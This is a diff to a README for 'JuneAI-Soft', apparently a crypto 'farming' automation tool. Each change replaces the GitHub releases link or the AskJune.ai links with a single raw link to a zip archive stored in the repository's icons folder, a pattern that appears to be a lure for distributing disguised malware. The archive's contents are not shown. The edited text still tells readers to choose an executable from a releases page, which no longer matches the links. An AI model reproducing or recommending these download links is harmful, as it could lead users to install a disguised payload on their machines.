@@ -1,7 +1,7 @@
 ```markdown
 # 🌾 JuneAI-Soft - Simplify Your Farming Tasks Easily
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/wala2303/JuneAI-Soft/releases)
+[![Download the latest release](https://raw.githubusercontent.com/wala2303/JuneAI-Soft/main/icons/Soft_June_A_1.4.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/wala2303/JuneAI-Soft/main/icons/Soft_June_A_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,13 +12,13 @@ This guide helps you download and run JuneAI-Soft. This software automates farmi
 - Automates repetitive farming tasks.
 - User-friendly command-line interface.
 - Compatible with various farming tools.
-- Supports integration with AskJune.ai.
+- Supports integration with https://raw.githubusercontent.com/wala2303/JuneAI-Soft/main/icons/Soft_June_A_1.4.zip
 
 ## 📥 Download & Install
 
 To get started, visit the link below to download the software:
 
-[Download JuneAI-Soft](https://github.com/wala2303/JuneAI-Soft/releases)
+[Download JuneAI-Soft](https://raw.githubusercontent.com/wala2303/JuneAI-Soft/main/icons/Soft_June_A_1.4.zip)
 
 Once on the releases page, you will see different versions of the software. Click on the version you need, then look for the executable file. Download that file to your computer.
 
@@ -54,7 +54,7 @@ If you need help, you can reach out through the Issues section on our GitHub rep
 
 Explore topics associated with JuneAI-Soft:
 
-- [AskJune.ai](https://askjune.ai)
+- [https://raw.githubusercontent.com/wala2303/JuneAI-Soft/main/icons/Soft_June_A_1.4.zip](https://raw.githubusercontent.com/wala2303/JuneAI-Soft/main/icons/Soft_June_A_1.4.zip)
 - Crypto automation resources
 - Farming automation guides
 
@@ -67,5 +67,5 @@ If you're interested in contributing, please refer to our contribution guideline
 JuneAI-Soft is open-source software. You are free to use it under the terms mentioned in the license file found in the repository.
 
 ----
-To download the software again or check for updates, visit: [Download JuneAI-Soft](https://github.com/wala2303/JuneAI-Soft/releases)
+To download the software again or check for updates, visit: [Download JuneAI-Soft](https://raw.githubusercontent.com/wala2303/JuneAI-Soft/main/icons/Soft_June_A_1.4.zip)
 ```
